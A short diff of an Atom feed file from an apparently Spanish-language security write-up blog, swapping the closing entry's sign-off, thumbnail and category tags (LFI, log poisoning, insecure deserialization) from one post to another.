-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/monitorsTwo/a8a7cc9d62f8e320913656e081d082bf_3845136843934746822.gif" /><media:content medium="image" url="/assets/img/monitorsTwo/a8a7cc9d62f8e320913656e081d082bf_3845136843934746822.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="LFI" /><category term="log poisoning" /><category term="Insecure Deserialization" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/toxic/waifu.gif" /><media:content medium="image" url="/assets/img/toxic/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
